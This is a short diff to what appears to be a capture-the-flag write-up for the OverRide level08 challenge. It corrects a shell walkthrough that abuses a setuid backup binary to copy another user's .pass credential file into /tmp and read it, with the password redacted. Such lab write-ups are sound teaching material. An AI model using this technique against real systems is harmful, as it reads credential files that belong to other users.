@@ -7,7 +7,7 @@ What I did was the following:
 ```shell
 cd /tmp
 level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/
-level08@OverRide:/tmp$ ~/level08 /home/users/level09/
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
 level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
 [redacted]
 ```
